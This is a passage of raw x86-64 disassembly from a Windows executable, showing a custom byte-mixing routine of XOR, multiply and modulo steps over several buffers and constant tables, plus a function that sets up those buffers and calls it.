   140004655:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000465a:	44 8b f3             	mov    %ebx,%r14d
   14000465d:	48 8b c5             	mov    %rbp,%rax
   140004660:	89 5c 24 14          	mov    %ebx,0x14(%rsp)
   140004664:	48 f7 d8             	neg    %rax
   140004667:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   14000466b:	45 33 e4             	xor    %r12d,%r12d
   14000466e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004673:	44 89 64 24 10       	mov    %r12d,0x10(%rsp)
   140004678:	44 8b db             	mov    %ebx,%r11d
   14000467b:	44 89 64 24 20       	mov    %r12d,0x20(%rsp)
   140004680:	8b c3                	mov    %ebx,%eax
   140004682:	44 89 64 24 0c       	mov    %r12d,0xc(%rsp)
   140004687:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   14000468b:	89 5c 24 08          	mov    %ebx,0x8(%rsp)
   14000468f:	90                   	nop
   140004690:	41 83 c4 fe          	add    $0xfffffffe,%r12d
   140004694:	48 8b fd             	mov    %rbp,%rdi
   140004697:	44 89 64 24 38       	mov    %r12d,0x38(%rsp)
   14000469c:	45 8d 44 24 04       	lea    0x4(%r12),%r8d
   1400046a1:	eb 12                	jmp    0x1400046b5
   1400046a3:	0f 1f 40 00          	nopl   0x0(%rax)
   1400046a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400046ae:	00 00 
   1400046b0:	44 8b 64 24 38       	mov    0x38(%rsp),%r12d
   1400046b5:	41 03 c0             	add    %r8d,%eax
   1400046b8:	99                   	cltd
   1400046b9:	f7 bc 24 d8 00 00 00 	idivl  0xd8(%rsp)
   1400046c0:	42 8d 04 06          	lea    (%rsi,%r8,1),%eax
   1400046c4:	48 63 ca             	movslq %edx,%rcx
   1400046c7:	25 1f 00 00 80       	and    $0x8000001f,%eax
   1400046cc:	7d 07                	jge    0x1400046d5
   1400046ce:	ff c8                	dec    %eax
   1400046d0:	83 c8 e0             	or     $0xffffffe0,%eax
   1400046d3:	ff c0                	inc    %eax
   1400046d5:	48 8b 94 24 d0 00 00 	mov    0xd0(%rsp),%rdx
   1400046dc:	00 
   1400046dd:	48 98                	cltq
   1400046df:	0f b6 0c 11          	movzbl (%rcx,%rdx,1),%ecx
   1400046e3:	48 8d 15 16 b9 ff ff 	lea    -0x46ea(%rip),%rdx        # 0x140000000
   1400046ea:	32 8c 10 00 70 00 00 	xor    0x7000(%rax,%rdx,1),%cl
   1400046f1:	43 8d 04 28          	lea    (%r8,%r13,1),%eax
   1400046f5:	25 1f 00 00 80       	and    $0x8000001f,%eax
   1400046fa:	7d 07                	jge    0x140004703
   1400046fc:	ff c8                	dec    %eax
   1400046fe:	83 c8 e0             	or     $0xffffffe0,%eax
   140004701:	ff c0                	inc    %eax
   140004703:	48 98                	cltq
   140004705:	32 8c 10 20 70 00 00 	xor    0x7020(%rax,%rdx,1),%cl
   14000470c:	43 8d 04 06          	lea    (%r14,%r8,1),%eax
   140004710:	25 7f 00 00 80       	and    $0x8000007f,%eax
   140004715:	7d 07                	jge    0x14000471e
   140004717:	ff c8                	dec    %eax
   140004719:	83 c8 80             	or     $0xffffff80,%eax
   14000471c:	ff c0                	inc    %eax
   14000471e:	48 8b 94 24 c0 00 00 	mov    0xc0(%rsp),%rdx
   140004725:	00 
   140004726:	48 98                	cltq
   140004728:	32 0c 10             	xor    (%rax,%rdx,1),%cl
   14000472b:	43 8d 04 03          	lea    (%r11,%r8,1),%eax
   14000472f:	25 ff 00 00 80       	and    $0x800000ff,%eax
   140004734:	7d 09                	jge    0x14000473f
   140004736:	ff c8                	dec    %eax
   140004738:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   14000473d:	ff c0                	inc    %eax
   14000473f:	48 98                	cltq
   140004741:	41 8d 58 fe          	lea    -0x2(%r8),%ebx
   140004745:	42 32 0c 38          	xor    (%rax,%r15,1),%cl
   140004749:	8b c3                	mov    %ebx,%eax
   14000474b:	0f b6 f1             	movzbl %cl,%esi
   14000474e:	25 ff 00 00 80       	and    $0x800000ff,%eax
   140004753:	7d 09                	jge    0x14000475e
   140004755:	ff c8                	dec    %eax
   140004757:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   14000475c:	ff c0                	inc    %eax
   14000475e:	4c 63 e8             	movslq %eax,%r13
   140004761:	43 8d 04 04          	lea    (%r12,%r8,1),%eax
   140004765:	4d 03 ef             	add    %r15,%r13
   140004768:	44 0f b6 3f          	movzbl (%rdi),%r15d
   14000476c:	25 7f 00 00 80       	and    $0x8000007f,%eax
   140004771:	7d 07                	jge    0x14000477a
   140004773:	ff c8                	dec    %eax
   140004775:	83 c8 80             	or     $0xffffff80,%eax
   140004778:	ff c0                	inc    %eax
   14000477a:	48 98                	cltq
   14000477c:	0f b6 14 10          	movzbl (%rax,%rdx,1),%edx
   140004780:	41 0f b6 45 00       	movzbl 0x0(%r13),%eax
   140004785:	69 c8 97 00 00 00    	imul   $0x97,%eax,%ecx
   14000478b:	41 69 c7 c7 00 00 00 	imul   $0xc7,%r15d,%eax
   140004792:	03 d1                	add    %ecx,%edx
   140004794:	41 03 c1             	add    %r9d,%eax
   140004797:	44 6b ce 71          	imul   $0x71,%esi,%r9d
   14000479b:	03 c2                	add    %edx,%eax
   14000479d:	44 03 c8             	add    %eax,%r9d
   1400047a0:	41 81 e1 ff 03 00 80 	and    $0x800003ff,%r9d
   1400047a7:	7d 0d                	jge    0x1400047b6
   1400047a9:	41 ff c9             	dec    %r9d
   1400047ac:	41 81 c9 00 fc ff ff 	or     $0xfffffc00,%r9d
   1400047b3:	41 ff c1             	inc    %r9d
   1400047b6:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   1400047ba:	4d 63 e1             	movslq %r9d,%r12
   1400047bd:	41 03 c1             	add    %r9d,%eax
   1400047c0:	4c 03 e5             	add    %rbp,%r12
   1400047c3:	45 0f b6 34 24       	movzbl (%r12),%r14d
   1400047c8:	25 ff 00 00 80       	and    $0x800000ff,%eax
   1400047cd:	7d 09                	jge    0x1400047d8
   1400047cf:	ff c8                	dec    %eax
   1400047d1:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   1400047d6:	ff c0                	inc    %eax
   1400047d8:	48 8b 94 24 b8 00 00 	mov    0xb8(%rsp),%rdx
   1400047df:	00 
   1400047e0:	48 98                	cltq
   1400047e2:	0f b6 0c 10          	movzbl (%rax,%rdx,1),%ecx
   1400047e6:	69 c1 83 00 00 00    	imul   $0x83,%ecx,%eax
   1400047ec:	6b ce 65             	imul   $0x65,%esi,%ecx
   1400047ef:	41 03 ca             	add    %r10d,%ecx
   1400047f2:	45 69 d6 9d 00 00 00 	imul   $0x9d,%r14d,%r10d
   1400047f9:	03 c8                	add    %eax,%ecx
   1400047fb:	44 03 d1             	add    %ecx,%r10d
   1400047fe:	41 81 e2 ff 03 00 80 	and    $0x800003ff,%r10d
   140004805:	7d 0d                	jge    0x140004814
   140004807:	41 ff ca             	dec    %r10d
   14000480a:	41 81 ca 00 fc ff ff 	or     $0xfffffc00,%r10d
   140004811:	41 ff c2             	inc    %r10d
   140004814:	41 8b c2             	mov    %r10d,%eax
   140004817:	25 ff 03 00 80       	and    $0x800003ff,%eax
   14000481c:	7d 09                	jge    0x140004827
   14000481e:	ff c8                	dec    %eax
   140004820:	0d 00 fc ff ff       	or     $0xfffffc00,%eax
   140004825:	ff c0                	inc    %eax
   140004827:	48 98                	cltq
   140004829:	48 03 e8             	add    %rax,%rbp
   14000482c:	8b 44 24 24          	mov    0x24(%rsp),%eax
   140004830:	41 03 c7             	add    %r15d,%eax
   140004833:	44 0f b6 5d 00       	movzbl 0x0(%rbp),%r11d
   140004838:	25 ff 00 00 80       	and    $0x800000ff,%eax
   14000483d:	7d 09                	jge    0x140004848
   14000483f:	ff c8                	dec    %eax
   140004841:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   140004846:	ff c0                	inc    %eax
   140004848:	48 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%rcx
   14000484f:	00 
   140004850:	41 8d 14 36          	lea    (%r14,%rsi,1),%edx
   140004854:	48 98                	cltq
   140004856:	32 14 08             	xor    (%rax,%rcx,1),%dl
   140004859:	8b 44 24 24          	mov    0x24(%rsp),%eax
   14000485d:	41 69 cb c1 00 00 00 	imul   $0xc1,%r11d,%ecx
   140004864:	41 03 c6             	add    %r14d,%eax
   140004867:	32 d1                	xor    %cl,%dl
   140004869:	88 17                	mov    %dl,(%rdi)
   14000486b:	25 ff 00 00 80       	and    $0x800000ff,%eax
   140004870:	7d 09                	jge    0x14000487b
   140004872:	ff c8                	dec    %eax
   140004874:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   140004879:	ff c0                	inc    %eax
   14000487b:	48 8b 8c 24 b8 00 00 	mov    0xb8(%rsp),%rcx
   140004882:	00 
   140004883:	41 0f b6 d3          	movzbl %r11b,%edx
   140004887:	48 98                	cltq
   140004889:	40 2a d6             	sub    %sil,%dl
   14000488c:	32 14 08             	xor    (%rax,%rcx,1),%dl
   14000488f:	41 69 cf b5 00 00 00 	imul   $0xb5,%r15d,%ecx
   140004896:	32 d1                	xor    %cl,%dl
   140004898:	41 88 14 24          	mov    %dl,(%r12)
   14000489c:	44 8b 64 24 24       	mov    0x24(%rsp),%r12d
   1400048a1:	43 8d 04 1c          	lea    (%r12,%r11,1),%eax
   1400048a5:	25 7f 00 00 80       	and    $0x8000007f,%eax
   1400048aa:	7d 07                	jge    0x1400048b3
   1400048ac:	ff c8                	dec    %eax
   1400048ae:	83 c8 80             	or     $0xffffff80,%eax
   1400048b1:	ff c0                	inc    %eax
   1400048b3:	41 69 d6 a7 00 00 00 	imul   $0xa7,%r14d,%edx
   1400048ba:	48 63 c8             	movslq %eax,%rcx
   1400048bd:	48 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%rax
   1400048c4:	00 
   1400048c5:	32 14 01             	xor    (%rcx,%rax,1),%dl
   1400048c8:	41 32 d7             	xor    %r15b,%dl
   1400048cb:	40 32 d6             	xor    %sil,%dl
   1400048ce:	88 55 00             	mov    %dl,0x0(%rbp)
   1400048d1:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   1400048d6:	48 8d 2c 17          	lea    (%rdi,%rdx,1),%rbp
   1400048da:	48 81 fd 00 01 00 00 	cmp    $0x100,%rbp
   1400048e1:	0f 8d bf 00 00 00    	jge    0x1400049a6
   1400048e7:	41 8d 40 ff          	lea    -0x1(%r8),%eax
   1400048eb:	25 ff 03 00 80       	and    $0x800003ff,%eax
   1400048f0:	7d 09                	jge    0x1400048fb
   1400048f2:	ff c8                	dec    %eax
   1400048f4:	0d 00 fc ff ff       	or     $0xfffffc00,%eax
   1400048f9:	ff c0                	inc    %eax
   1400048fb:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
   140004902:	00 
   140004903:	48 98                	cltq
   140004905:	44 0f b6 1c 08       	movzbl (%rax,%rcx,1),%r11d
   14000490a:	41 c0 eb 04          	shr    $0x4,%r11b
   14000490e:	81 e3 ff 03 00 80    	and    $0x800003ff,%ebx
   140004914:	7d 0a                	jge    0x140004920
   140004916:	ff cb                	dec    %ebx
   140004918:	81 cb 00 fc ff ff    	or     $0xfffffc00,%ebx
   14000491e:	ff c3                	inc    %ebx
   140004920:	48 63 c3             	movslq %ebx,%rax
   140004923:	8b 5c 24 1c          	mov    0x1c(%rsp),%ebx
   140004927:	0f b6 0c 08          	movzbl (%rax,%rcx,1),%ecx
   14000492b:	8b 44 24 20          	mov    0x20(%rsp),%eax
   14000492f:	03 c3                	add    %ebx,%eax
   140004931:	c0 e1 04             	shl    $0x4,%cl
   140004934:	41 03 c0             	add    %r8d,%eax
   140004937:	44 0a d9             	or     %cl,%r11b
   14000493a:	25 1f 00 00 80       	and    $0x8000001f,%eax
   14000493f:	7d 07                	jge    0x140004948
   140004941:	ff c8                	dec    %eax
   140004943:	83 c8 e0             	or     $0xffffffe0,%eax
   140004946:	ff c0                	inc    %eax
   140004948:	48 98                	cltq
   14000494a:	48 8d 0d af b6 ff ff 	lea    -0x4951(%rip),%rcx        # 0x140000000
   140004951:	44 02 9c 08 00 70 00 	add    0x7000(%rax,%rcx,1),%r11b
   140004958:	00 
   140004959:	40 0f b6 c6          	movzbl %sil,%eax
   14000495d:	0f b6 0f             	movzbl (%rdi),%ecx
   140004960:	24 1f                	and    $0x1f,%al
   140004962:	0f b6 d0             	movzbl %al,%edx
   140004965:	0f af d1             	imul   %ecx,%edx
   140004968:	44 02 da             	add    %dl,%r11b
   14000496b:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140004970:	44 00 1c 17          	add    %r11b,(%rdi,%rdx,1)
   140004974:	0f b6 0c 17          	movzbl (%rdi,%rdx,1),%ecx
   140004978:	8d 04 0e             	lea    (%rsi,%rcx,1),%eax
   14000497b:	41 03 c4             	add    %r12d,%eax
   14000497e:	25 ff 00 00 80       	and    $0x800000ff,%eax
   140004983:	7d 09                	jge    0x14000498e
   140004985:	ff c8                	dec    %eax
   140004987:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   14000498c:	ff c0                	inc    %eax
   14000498e:	4c 8b b4 24 c8 00 00 	mov    0xc8(%rsp),%r14
   140004995:	00 
   140004996:	48 98                	cltq
   140004998:	42 32 0c 30          	xor    (%rax,%r14,1),%cl
   14000499c:	88 0c 17             	mov    %cl,(%rdi,%rdx,1)
   14000499f:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   1400049a4:	eb 0c                	jmp    0x1400049b2
   1400049a6:	4c 8b b4 24 c8 00 00 	mov    0xc8(%rsp),%r14
   1400049ad:	00 
   1400049ae:	8b 5c 24 1c          	mov    0x1c(%rsp),%ebx
   1400049b2:	48 81 fd 80 00 00 00 	cmp    $0x80,%rbp
   1400049b9:	0f 8d 92 00 00 00    	jge    0x140004a51
   1400049bf:	41 8b c0             	mov    %r8d,%eax
   1400049c2:	25 ff 00 00 80       	and    $0x800000ff,%eax
   1400049c7:	7d 09                	jge    0x1400049d2
   1400049c9:	ff c8                	dec    %eax
   1400049cb:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   1400049d0:	ff c0                	inc    %eax
   1400049d2:	4c 8b bc 24 b8 00 00 	mov    0xb8(%rsp),%r15
   1400049d9:	00 
   1400049da:	48 98                	cltq
   1400049dc:	42 0f b6 0c 38       	movzbl (%rax,%r15,1),%ecx
   1400049e1:	41 0f b6 45 00       	movzbl 0x0(%r13),%eax
   1400049e6:	c0 e8 03             	shr    $0x3,%al
   1400049e9:	c0 e1 05             	shl    $0x5,%cl
   1400049ec:	0a c8                	or     %al,%cl
   1400049ee:	8b 44 24 10          	mov    0x10(%rsp),%eax
   1400049f2:	03 c3                	add    %ebx,%eax
   1400049f4:	41 03 c0             	add    %r8d,%eax
   1400049f7:	25 1f 00 00 80       	and    $0x8000001f,%eax
   1400049fc:	7d 07                	jge    0x140004a05
   1400049fe:	ff c8                	dec    %eax
   140004a00:	83 c8 e0             	or     $0xffffffe0,%eax
   140004a03:	ff c0                	inc    %eax
   140004a05:	48 98                	cltq
   140004a07:	4c 8d 1d f2 b5 ff ff 	lea    -0x4a0e(%rip),%r11        # 0x140000000
   140004a0e:	42 02 8c 18 20 70 00 	add    0x7020(%rax,%r11,1),%cl
   140004a15:	00 
   140004a16:	40 0f b6 c6          	movzbl %sil,%eax
   140004a1a:	4c 8b 5c 24 40       	mov    0x40(%rsp),%r11
   140004a1f:	02 c0                	add    %al,%al
   140004a21:	02 c8                	add    %al,%cl
   140004a23:	02 0f                	add    (%rdi),%cl
   140004a25:	41 30 0c 3b          	xor    %cl,(%r11,%rdi,1)
   140004a29:	41 0f b6 0c 3b       	movzbl (%r11,%rdi,1),%ecx
   140004a2e:	8b c1                	mov    %ecx,%eax
   140004a30:	33 c6                	xor    %esi,%eax
   140004a32:	41 33 c4             	xor    %r12d,%eax
   140004a35:	25 ff 00 00 80       	and    $0x800000ff,%eax
   140004a3a:	7d 09                	jge    0x140004a45
   140004a3c:	ff c8                	dec    %eax
   140004a3e:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   140004a43:	ff c0                	inc    %eax
   140004a45:	48 98                	cltq
   140004a47:	42 02 0c 30          	add    (%rax,%r14,1),%cl
   140004a4b:	41 88 0c 3b          	mov    %cl,(%r11,%rdi,1)
   140004a4f:	eb 08                	jmp    0x140004a59
   140004a51:	4c 8b bc 24 b8 00 00 	mov    0xb8(%rsp),%r15
   140004a58:	00 
   140004a59:	48 8b ac 24 b0 00 00 	mov    0xb0(%rsp),%rbp
   140004a60:	00 
   140004a61:	48 ff c7             	inc    %rdi
   140004a64:	44 8b 5c 24 04       	mov    0x4(%rsp),%r11d
   140004a69:	41 ff c0             	inc    %r8d
   140004a6c:	8b 74 24 18          	mov    0x18(%rsp),%esi
   140004a70:	44 8b 74 24 30       	mov    0x30(%rsp),%r14d
   140004a75:	44 8b 6c 24 14       	mov    0x14(%rsp),%r13d
   140004a7a:	48 8d 04 17          	lea    (%rdi,%rdx,1),%rax
   140004a7e:	48 3d 00 04 00 00    	cmp    $0x400,%rax
   140004a84:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140004a88:	0f 8c 22 fc ff ff    	jl     0x1400046b0
   140004a8e:	83 44 24 0c 03       	addl   $0x3,0xc(%rsp)
   140004a93:	41 ff c4             	inc    %r12d
   140004a96:	83 44 24 20 13       	addl   $0x13,0x20(%rsp)
   140004a9b:	83 c0 0a             	add    $0xa,%eax
   140004a9e:	83 44 24 10 17       	addl   $0x17,0x10(%rsp)
   140004aa3:	41 83 c3 06          	add    $0x6,%r11d
   140004aa7:	41 83 c6 04          	add    $0x4,%r14d
   140004aab:	44 89 64 24 24       	mov    %r12d,0x24(%rsp)
   140004ab0:	41 83 c5 10          	add    $0x10,%r13d
   140004ab4:	89 44 24 08          	mov    %eax,0x8(%rsp)
   140004ab8:	83 c6 0c             	add    $0xc,%esi
   140004abb:	44 89 5c 24 04       	mov    %r11d,0x4(%rsp)
   140004ac0:	ff cb                	dec    %ebx
   140004ac2:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   140004ac7:	44 89 6c 24 14       	mov    %r13d,0x14(%rsp)
   140004acc:	89 74 24 18          	mov    %esi,0x18(%rsp)
   140004ad0:	89 5c 24 1c          	mov    %ebx,0x1c(%rsp)
   140004ad4:	83 f8 12             	cmp    $0x12,%eax
   140004ad7:	0f 8c b3 fb ff ff    	jl     0x140004690
   140004add:	4c 8b 74 24 68       	mov    0x68(%rsp),%r14
   140004ae2:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   140004ae7:	48 8b bc 24 80 00 00 	mov    0x80(%rsp),%rdi
   140004aee:	00 
   140004aef:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   140004af6:	00 
   140004af7:	4c 8b 6c 24 70       	mov    0x70(%rsp),%r13
   140004afc:	48 8b ac 24 88 00 00 	mov    0x88(%rsp),%rbp
   140004b03:	00 
   140004b04:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140004b0b:	41 5f                	pop    %r15
   140004b0d:	5e                   	pop    %rsi
   140004b0e:	c3                   	ret
   140004b0f:	cc                   	int3
   140004b10:	48 85 c9             	test   %rcx,%rcx
   140004b13:	0f 84 82 0a 00 00    	je     0x14000559b
   140004b19:	48 8b c4             	mov    %rsp,%rax
   140004b1c:	4c 89 48 20          	mov    %r9,0x20(%rax)
   140004b20:	4c 89 40 18          	mov    %r8,0x18(%rax)
   140004b24:	48 89 50 10          	mov    %rdx,0x10(%rax)
   140004b28:	48 89 48 08          	mov    %rcx,0x8(%rax)
   140004b2c:	55                   	push   %rbp
   140004b2d:	56                   	push   %rsi
   140004b2e:	41 56                	push   %r14
   140004b30:	48 8d 68 c8          	lea    -0x38(%rax),%rbp
   140004b34:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
   140004b3b:	4d 8b f1             	mov    %r9,%r14
   140004b3e:	49 8b f0             	mov    %r8,%rsi
   140004b41:	4d 85 c0             	test   %r8,%r8
   140004b44:	0f 84 46 0a 00 00    	je     0x140005590
   140004b4a:	49 83 f9 40          	cmp    $0x40,%r9
   140004b4e:	0f 82 3c 0a 00 00    	jb     0x140005590
   140004b54:	48 85 d2             	test   %rdx,%rdx
   140004b57:	0f 84 33 0a 00 00    	je     0x140005590
   140004b5d:	48 89 58 e0          	mov    %rbx,-0x20(%rax)
   140004b61:	4c 8d 4d 90          	lea    -0x70(%rbp),%r9
   140004b65:	48 89 78 d8          	mov    %rdi,-0x28(%rax)
   140004b69:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   140004b6e:	33 ff                	xor    %edi,%edi
   140004b70:	bb 01 00 00 00       	mov    $0x1,%ebx
   140004b75:	8b d3                	mov    %ebx,%edx
   140004b77:	48 89 7c 24 58       	mov    %rdi,0x58(%rsp)
   140004b7c:	b9 00 04 00 00       	mov    $0x400,%ecx
   140004b81:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140004b86:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   140004b8b:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   140004b90:	48 89 7d 90          	mov    %rdi,-0x70(%rbp)
   140004b94:	e8 c7 0d 00 00       	call   0x140005960
   140004b99:	85 c0                	test   %eax,%eax
   140004b9b:	0f 85 df 09 00 00    	jne    0x140005580
   140004ba1:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140004ba6:	33 d2                	xor    %edx,%edx
   140004ba8:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140004bae:	e8 ed 0e 00 00       	call   0x140005aa0
   140004bb3:	4c 8d 4d 90          	lea    -0x70(%rbp),%r9
   140004bb7:	8b d3                	mov    %ebx,%edx
   140004bb9:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   140004bbe:	b9 00 01 00 00       	mov    $0x100,%ecx
   140004bc3:	e8 98 0d 00 00       	call   0x140005960
   140004bc8:	85 c0                	test   %eax,%eax
   140004bca:	74 0f                	je     0x140004bdb
   140004bcc:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140004bd1:	e8 1a 0e 00 00       	call   0x1400059f0
   140004bd6:	e9 a5 09 00 00       	jmp    0x140005580
   140004bdb:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140004be0:	33 d2                	xor    %edx,%edx
   140004be2:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140004be8:	e8 b3 0e 00 00       	call   0x140005aa0
   140004bed:	4c 8d 4d 90          	lea    -0x70(%rbp),%r9
   140004bf1:	48 8b d3             	mov    %rbx,%rdx
   140004bf4:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   140004bf9:	b9 80 00 00 00       	mov    $0x80,%ecx
   140004bfe:	e8 5d 0d 00 00       	call   0x140005960
   140004c03:	85 c0                	test   %eax,%eax
   140004c05:	74 19                	je     0x140004c20
   140004c07:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140004c0c:	e8 df 0d 00 00       	call   0x1400059f0
   140004c11:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140004c16:	e8 d5 0d 00 00       	call   0x1400059f0
   140004c1b:	e9 60 09 00 00       	jmp    0x140005580
   140004c20:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140004c25:	4c 8d 4d 90          	lea    -0x70(%rbp),%r9
   140004c29:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004c2c:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140004c31:	48 8b d3             	mov    %rbx,%rdx
   140004c34:	b9 00 01 00 00       	mov    $0x100,%ecx
   140004c39:	0f 11 00             	movups %xmm0,(%rax)
   140004c3c:	0f 11 40 10          	movups %xmm0,0x10(%rax)
   140004c40:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   140004c44:	0f 11 40 30          	movups %xmm0,0x30(%rax)
   140004c48:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   140004c4c:	0f 11 40 50          	movups %xmm0,0x50(%rax)
   140004c50:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   140004c54:	0f 11 40 70          	movups %xmm0,0x70(%rax)
   140004c58:	e8 03 0d 00 00       	call   0x140005960
   140004c5d:	85 c0                	test   %eax,%eax
   140004c5f:	74 23                	je     0x140004c84
   140004c61:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140004c66:	e8 85 0d 00 00       	call   0x1400059f0
   140004c6b:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140004c70:	e8 7b 0d 00 00       	call   0x1400059f0
   140004c75:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140004c7a:	e8 71 0d 00 00       	call   0x1400059f0
   140004c7f:	e9 fc 08 00 00       	jmp    0x140005580
   140004c84:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140004c89:	33 d2                	xor    %edx,%edx
   140004c8b:	4c 89 a4 24 08 01 00 	mov    %r12,0x108(%rsp)
   140004c92:	00 
   140004c93:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140004c99:	4c 89 ac 24 00 01 00 	mov    %r13,0x100(%rsp)
   140004ca0:	00 
   140004ca1:	4c 89 bc 24 f8 00 00 	mov    %r15,0xf8(%rsp)
   140004ca8:	00 
   140004ca9:	e8 f2 0d 00 00       	call   0x140005aa0
   140004cae:	4c 8b 4c 24 70       	mov    0x70(%rsp),%r9
   140004cb3:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140004cb8:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140004cbd:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140004cc2:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140004cc7:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004ccc:	e8 ef f0 ff ff       	call   0x140003dc0
   140004cd1:	48 b8 ab aa aa aa aa 	movabs $0xaaaaaaaaaaaaaaab,%rax
   140004cd8:	aa aa aa 
   140004cdb:	8b df                	mov    %edi,%ebx
   140004cdd:	49 f7 e6             	mul    %r14
   140004ce0:	44 8b e7             	mov    %edi,%r12d
   140004ce3:	44 8b ff             	mov    %edi,%r15d
   140004ce6:	48 8b c2             	mov    %rdx,%rax
   140004ce9:	44 8b cf             	mov    %edi,%r9d
   140004cec:	48 8b 7d 58          	mov    0x58(%rbp),%rdi
   140004cf0:	33 d2                	xor    %edx,%edx
   140004cf2:	48 d1 e8             	shr    $1,%rax
   140004cf5:	49 f7 f6             	div    %r14
   140004cf8:	49 8b c6             	mov    %r14,%rax
   140004cfb:	48 d1 e8             	shr    $1,%rax
   140004cfe:	48 8b ca             	mov    %rdx,%rcx
   140004d01:	33 d2                	xor    %edx,%edx
   140004d03:	49 f7 f6             	div    %r14
   140004d06:	0f b6 04 31          	movzbl (%rcx,%rsi,1),%eax
   140004d0a:	32 04 32             	xor    (%rdx,%rsi,1),%al
   140004d0d:	42 32 44 36 ff       	xor    -0x1(%rsi,%r14,1),%al
   140004d12:	32 06                	xor    (%rsi),%al
   140004d14:	34 71                	xor    $0x71,%al
   140004d16:	88 44 24 50          	mov    %al,0x50(%rsp)
   140004d1a:	0f b6 c0             	movzbl %al,%eax
   140004d1d:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140004d21:	ff c3                	inc    %ebx
   140004d23:	81 e3 ff 03 00 80    	and    $0x800003ff,%ebx
   140004d29:	7d 0a                	jge    0x140004d35
   140004d2b:	ff cb                	dec    %ebx
   140004d2d:	81 cb 00 fc ff ff    	or     $0xfffffc00,%ebx
   140004d33:	ff c3                	inc    %ebx
   140004d35:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140004d3a:	41 8b c9             	mov    %r9d,%ecx
   140004d3d:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   140004d42:	83 e1 7f             	and    $0x7f,%ecx
   140004d45:	45 0f b6 c1          	movzbl %r9b,%r8d
   140004d49:	45 8b d9             	mov    %r9d,%r11d
   140004d4c:	41 83 e3 1f          	and    $0x1f,%r11d
   140004d50:	45 0f b6 14 00       	movzbl (%r8,%rax,1),%r10d
   140004d55:	48 63 c3             	movslq %ebx,%rax
   140004d58:	49 03 c6             	add    %r14,%rax
   140004d5b:	44 89 55 80          	mov    %r10d,-0x80(%rbp)
   140004d5f:	48 89 45 98          	mov    %rax,-0x68(%rbp)
   140004d63:	44 0f b6 28          	movzbl (%rax),%r13d
   140004d67:	41 8b c1             	mov    %r9d,%eax
   140004d6a:	99                   	cltd
   140004d6b:	f7 ff                	idiv   %edi
   140004d6d:	48 63 c2             	movslq %edx,%rax
   140004d70:	0f b6 14 30          	movzbl (%rax,%rsi,1),%edx
   140004d74:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140004d79:	0f b6 0c 01          	movzbl (%rcx,%rax,1),%ecx
   140004d7d:	48 8d 05 7c b2 ff ff 	lea    -0x4d84(%rip),%rax        # 0x140000000
   140004d84:	41 0f b6 84 03 00 70 	movzbl 0x7000(%r11,%rax,1),%eax
   140004d8b:	00 00 
   140004d8d:	03 d1                	add    %ecx,%edx
   140004d8f:	03 d0                	add    %eax,%edx
   140004d91:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140004d96:	41 0f b6 04 00       	movzbl (%r8,%rax,1),%eax
   140004d9b:	03 44 24 78          	add    0x78(%rsp),%eax
   140004d9f:	03 c2                	add    %edx,%eax
   140004da1:	41 03 c5             	add    %r13d,%eax
   140004da4:	41 03 c2             	add    %r10d,%eax
   140004da7:	44 03 e0             	add    %eax,%r12d
   140004daa:	41 81 e4 ff 03 00 80 	and    $0x800003ff,%r12d
